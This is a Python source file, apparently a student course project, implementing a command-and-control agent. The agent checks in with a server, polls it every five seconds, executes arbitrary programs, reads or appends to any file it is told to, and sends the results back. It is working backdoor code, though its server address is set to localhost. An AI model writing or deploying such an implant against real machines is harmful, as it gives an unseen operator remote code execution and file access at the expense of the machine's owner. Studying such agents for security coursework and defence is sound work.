# ===---------------------------------------------------------------------=== #
#
# CPSC4240 Project, Fall 24
# Adam Clements, Evan Cox, Isaac Fletcher, Tim Koehler
#
# ===---------------------------------------------------------------------=== #

from aiohttp import ClientSession
from subprocess import run
from time import sleep
from payloads import *
import asyncio

ID = None

SERVER_URL = "http://localhost:8080"

async def parse_command(command: dict) -> None:
    res = ""

    try:
        if command['action'] == 'execute':
            print([command['path']] + command['payload'])
            proc = run([command['path']] + command['payload'], capture_output=True)
            res = proc.stdout.decode()
        elif command['action'] == 'read':
            with open(command['path'],  'r') as f:
                res = f.read()
        elif command['action'] == 'write':
            with open(command['path'], 'a') as f:
                res = f.write(command['payload'][0])
        else:
            res = f"Unknown action: {command['action']}"

    except Exception as e:
        res = f'Exception in parsing command: {e}'
    
    async with ClientSession() as session:
        url = f'{SERVER_URL}/result/'
        async with session.post(url, json={"id": ID, "result": res}) as response:
            pass

async def obtain_id() -> dict:
    async with ClientSession() as session:
        url = f'{SERVER_URL}/init'
        async with session.get(url) as response:
            json_reply = await response.json()
            return json_reply['id']

async def main():
    global ID
    ID = await obtain_id()
    cmd_queue = []
    while True:
        async with ClientSession() as session:
            url = f'{SERVER_URL}/check/{ID}'
            async with session.get(url) as response:
                returned_cmds = await response.json()
                for cmd in returned_cmds:
                    cmd_queue.append(cmd)
        if len(cmd_queue) > 0:
            await parse_command(cmd_queue.pop(0))
        sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
